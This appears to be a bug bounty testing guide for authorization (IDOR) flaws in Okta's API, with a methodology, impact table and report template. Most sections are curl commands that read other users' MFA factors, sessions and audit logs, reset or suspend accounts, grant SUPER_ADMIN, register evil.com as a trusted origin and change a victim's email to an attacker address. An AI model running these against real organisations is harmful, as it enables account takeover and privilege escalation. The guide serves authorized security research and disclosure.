# Okta IDOR Testing Guide

## Program Overview

| Attribute | Details |
|-----------|---------|
| **Platform** | Bugcrowd (not HackerOne) |
| **Program Type** | Bug Bounty + VDP |
| **Scope** | Okta Identity Cloud (*.okta.com, *.oktapreview.com) |
| **Bounty Range** | $50 - $150,000+ (Critical) |
| **Key Targets** | Users, Groups, Sessions, Applications, Admin APIs |

---

## 🚨 Important Notes

1. **Okta is on Bugcrowd** - Not HackerOne, submit via Bugcrowd portal
2. **VDP Only for non-invited researchers** - Contact disclosure@okta.com
3. **Private Program** - Must be invited or meet Bugcrowd requirements
4. **Test on oktapreview.com** - Development/trial environments

---

## IDOR Patterns & Attack Vectors

### 1. User ID Enumeration

**Pattern:** `GET /api/v1/users/{userId}`

Okta uses alphanumeric IDs (e.g., `00u1a2b3c4D5E6F7G8h9`). While not purely numeric, they can be enumerable if:
- Rate limiting is insufficient
- IDs are exposed in logs, responses, or other endpoints
- Token scope allows broad user access

**Test Cases:**

```bash
# Test 1: Enumerate users with different token scopes
# Get user list with broad scope
curl -s "https://okta.com/api/v1/users" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Access another user's profile by ID
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"

# Expected: 200 OK if IDOR exists, 403 Forbidden if secure
```

### 2. Group Membership IDOR

**Pattern:** `GET /api/v1/groups/{groupId}/users`

**Test Cases:**

```bash
# Test 1: List users in a group you don't own
curl -s "https://okta.com/api/v1/groups/00g1a2b3c4D5E6F7G8h9/users" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Add user to group (POST-based IDOR)
curl -s -X POST "https://okta.com/api/v1/groups/00g1a2b3c4D5E6F7G8h9/users/${userId}" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Remove user from group
curl -s -X DELETE "https://okta.com/api/v1/groups/00g1a2b3c4D5E6F7G8h9/users/${userId}" -H "Authorization: SSWS ${TOKEN}"
```

### 3. Application Assignment IDOR

**Pattern:** `GET /api/v1/apps/{appId}/users`

**Test Cases:**

```bash
# Test 1: List users assigned to application
curl -s "https://okta.com/api/v1/apps/0oa1a2b3c4D5E6F7G8h9/users" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Assign application to user
curl -s -X POST "https://okta.com/api/v1/apps/0oa1a2b3c4D5E6F7G8h9/users/${userId}" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Unassign application
curl -s -X DELETE "https://okta.com/api/v1/apps/0oa1a2b3c4D5E6F7G8h9/users/${userId}" -H "Authorization: SSWS ${TOKEN}"
```

### 4. Session Manipulation

**Pattern:** `GET /api/v1/sessions/{sessionId}`

**Test Cases:**

```bash
# Test 1: Access another user's session
curl -s "https://okta.com/api/v1/sessions/00S1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Terminate another user's session
curl -s -X DELETE "https://okta.com/api/v1/sessions/00S1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Get session flags/lifecycle
curl -s "https://okta.com/api/v1/sessions/00S1a2b3c4D5E6F7G8h9/lifecycle" -H "Authorization: SSWS ${TOKEN}"
```

### 5. User Profile/Metadata IDOR

**Pattern:** `GET /api/v1/users/{userId}` or `PATCH /api/v1/users/{userId}`

**Test Cases:**

```bash
# Test 1: Read another user's profile
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Update another user's profile
curl -s -X PATCH "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}" -H "Content-Type: application/json" -d '{"profile": {"nickName": "hacked"}}'

# Test 3: Get user factors
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/factors" -H "Authorization: SSWS ${TOKEN}"

# Test 4: Get user apps
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/appLinks" -H "Authorization: SSWS ${TOKEN}"

# Test 5: Get user's groups (SENSITIVE - reveals group membership)
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/groups" -H "Authorization: SSWS ${TOKEN}"

# Test 6: Get user's roles
curl -s "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/roles" -H "Authorization: SSWS ${TOKEN}"
```

### 6. User Lifecycle Operations IDOR

**Pattern:** `POST /api/v1/users/{userId}/lifecycle/{action}`

**Test Cases:**

```bash
# Test 1: Suspend another user
curl -s -X POST "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/lifecycle/suspend" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Deactivate another user
curl -s -X POST "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/lifecycle/deactivate" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Reset password for another user
curl -s -X POST "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/lifecycle/reset_password" -H "Authorization: SSWS ${TOKEN}"

# Test 4: Reset MFA factors for another user
curl -s -X POST "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/lifecycle/reset_factors" -H "Authorization: SSWS ${TOKEN}"

# Test 5: Expire password for another user
curl -s -X POST "https://okta.com/api/v1/users/00u1a2b3c4D5E6F7G8h9/lifecycle/expire_password" -H "Authorization: SSWS ${TOKEN}"
```

### 7. Group Roles/Admin IDOR

**Pattern:** `GET/PUT /api/v1/groups/{groupId}/roles`

**Test Cases:**

```bash
# Test 1: Get group roles
curl -s "https://okta.com/api/v1/groups/00g1a2b3c4D5E6F7G8h9/roles" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Assign role to group
curl -s -X PUT "https://okta.com/api/v1/groups/00g1a2b3c4D5E6F7G8h9/roles/SUPER_ADMIN" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Get role assignments
curl -s "https://okta.com/api/v1/roles/ROLE_ID/users" -H "Authorization: SSWS ${TOKEN}"

# Test 4: List all roles
curl -s "https://okta.com/api/v1/roles" -H "Authorization: SSWS ${TOKEN}"
```

### 8. Audit Logs Access IDOR

**Pattern:** `GET /api/v1/logs`

**Test Cases:**

```bash
# Test 1: Access audit logs (high impact - exposes all org activity)
curl -s "https://okta.com/api/v1/logs?limit=100" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Access specific log entry by ID
curl -s "https://okta.com/api/v1/logs/LO000000000000000000" -H "Authorization: SSWS ${TOKEN}"

# Test 3: Query logs by actor (user)
curl -s "https://okta.com/api/v1/logs?actor=00u1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"

# Test 4: Query logs by target
curl -s "https://okta.com/api/v1/logs?target=00u1a2b3c4D5E6F7G8h9" -H "Authorization: SSWS ${TOKEN}"
```

### 9. Trusted Origins/CORS IDOR

**Pattern:** `GET/POST /api/v1/trustedOrigins`

**Test Cases:**

```bash
# Test 1: List trusted origins
curl -s "https://okta.com/api/v1/trustedOrigins" -H "Authorization: SSWS ${TOKEN}"

# Test 2: Create trusted origin for your domain
curl -s -X POST "https://okta.com/api/v1/trustedOrigins" -H "Authorization: SSWS ${TOKEN}" -H "Content-Type: application/json" -d '{"name": "Attacker", "origin": "https://evil.com", "scopes": ["CORS", "REDIRECT"]}'

# Test 3: Access another origin's configuration
curl -s "https://okta.com/api/v1/trustedOrigins/00porigin123456789" -H "Authorization: SSWS ${TOKEN}"

# Test 4: Update another origin
curl -s -X PUT "https://okta.com/api/v1/trustedOrigins/00porigin123456789" -H "Authorization: SSWS ${TOKEN}" -H "Content-Type: application/json" -d '{"origin": "https://attacker.com"}'
```

---

## Testing Methodology

### Phase 1: Setup and Reconnaissance

```bash
# 1. Create test accounts on oktapreview.com
# https://www.oktapreview.com

# 2. Get API token with different scopes
# Request tokens with: okta.users.read, okta.users.manage, okta.groups.read, okta.groups.manage

# 3. Identify your test user and admin user IDs
curl -s "https://okta.com/api/v1/users/me" -H "Authorization: SSWS ${TOKEN}"
```

### Phase 2: Baseline Testing

```bash
# 1. Create two test users (User A and User B)
# Get their IDs

# 2. Verify User A can access their own profile
curl -s "https://okta.com/api/v1/users/${USER_A_ID}" -H "Authorization: SSWS ${USER_A_TOKEN}"

# 3. Verify User A cannot access User B's profile (control test)
curl -s "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${USER_A_TOKEN}"
# Should return 403 Forbidden
```

### Phase 3: IDOR Exploitation

```bash
# 1. Try to access User B's resources with User A's token
# This demonstrates the IDOR

# 2. Try horizontal escalation (same privilege level)
curl -s "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${USER_A_TOKEN}"

# 3. Try vertical escalation (if you have low-privilege token)
curl -s "https://okta.com/api/v1/users/${ADMIN_ID}" -H "Authorization: SSWS ${LOW_PRIV_TOKEN}"
```

### Phase 4: Impact Demonstration

```bash
# Demonstrate real impact by accessing sensitive data

# 1. Access user's security factors (MFA devices)
curl -s "https://okta.com/api/v1/users/${USER_B_ID}/factors" -H "Authorization: SSWS ${USER_A_TOKEN}"

# 2. Access user's sessions
curl -s "https://okta.com/api/v1/users/${USER_B_ID}/sessions" -H "Authorization: SSWS ${USER_A_TOKEN}"

# 3. Modify user profile
curl -s -X PATCH "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${USER_A_TOKEN}" -H "Content-Type: application/json" -d '{"profile": {"email": "attacker@evil.com"}}'
```

---

## Common IDOR Indicators

| Indicator | HTTP Code | Meaning |
|-----------|-----------|---------|
| **Success** | `200 OK` | ✅ Potential IDOR - returned data for unauthorized resource |
| **Forbidden** | `403 Forbidden` | ✅ Secure - proper authorization |
| **Not Found** | `404 Not Found` | ⚠️ Resource doesn't exist OR hidden |
| **Unauthorized** | `401 Unauthorized` | Token invalid or missing |
| **Gone** | `410 Gone` | Resource deleted but ID was valid |

---

## IDOR Bypass Techniques

### 1. ID Enumeration
- Increment/decrement numeric IDs
- Try variations of known IDs
- Check for ID exposure in other API responses

### 2. Parameter Pollution
```bash
# Add multiple ID parameters
curl -s "https://okta.com/api/v1/users?id=${USER_A_ID}&id=${USER_B_ID}" -H "Authorization: SSWS ${TOKEN}"
```

### 3. HTTP Method Switching
```bash
# Try different methods on the same endpoint
curl -s -X PUT "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${TOKEN}"
curl -s -X PATCH "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${TOKEN}"
```

### 4. Content-Type Manipulation
```bash
# Try different content types
curl -s -X PATCH "https://okta.com/api/v1/users/${USER_B_ID}" -H "Authorization: SSWS ${TOKEN}" -H "Content-Type: application/x-www-form-urlencoded" -d "profile[nickName]=hacked"
```

---

## Impact Assessment

| Access Type | Impact | Example |
|-------------|--------|---------|
| **Read User Profile** | Medium | Access other users' PII, emails, names |
| **Read MFA Factors** | **Critical** | Steal second-factor credentials |
| **Modify User Profile** | High | Change email, phone, compromise account |
| **Access Sessions** | **Critical** | Session hijacking, full account takeover |
| **Modify Group Membership** | High | Add self to admin groups, privilege escalation |
| **Modify App Assignments** | Medium | Add/remove applications user has access to |

---

## Report Template

```markdown
## Title
IDOR Allowing [Impact] via [Endpoint/Parameter]

## Summary
[One paragraph describing the vulnerability]

## Steps to Reproduce
1. Login to Okta with User A account
2. Navigate to [location] or obtain API token with scope [scope]
3. Send the following request:
```bash
curl -s "https://okta.com/api/v1/[endpoint]/${VICTIM_ID}" -H "Authorization: SSWS ${TOKEN}"
```
4. Observe that [sensitive data] is returned in the response

## Expected vs Actual
- **Expected:** 403 Forbidden or 404 Not Found
- **Actual:** 200 OK with [sensitive data]

## Impact
[Explain the security impact - what can an attacker do?]

## Remediation
[Suggest how to fix the IDOR]
```

---

## Testing Checklist

- [ ] Create test accounts on oktapreview.com
- [ ] Obtain API tokens with different scopes
- [ ] Test `/api/v1/users/{userId}` for user enumeration
- [ ] Test `/api/v1/users/{userId}/groups` for group membership exposure
- [ ] Test `/api/v1/users/{userId}/roles` for privilege escalation
- [ ] Test `/api/v1/users/{userId}/lifecycle/*` for lifecycle operations IDOR
- [ ] Test `/api/v1/groups/{groupId}/users` for group membership access
- [ ] Test `/api/v1/groups/{groupId}/roles` for admin role access
- [ ] Test `/api/v1/apps/{appId}/users` for app assignment access
- [ ] Test `/api/v1/sessions/{sessionId}` for session manipulation
- [ ] Test user factors endpoint for MFA bypass
- [ ] Test profile modification endpoints
- [ ] Test `/api/v1/logs` for audit log access IDOR
- [ ] Test `/api/v1/trustedOrigins` for CORS configuration IDOR
- [ ] Document all successful IDOR findings with PoC

---

## References

- [Okta API Documentation](https://developer.okta.com/docs/api/)
- [Okta Bug Bounty Program](https://bugcrowd.com/okta)
- [OWASP IDOR Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [Bugcrowd VRT](https://www.bugcrowd.com/vrt)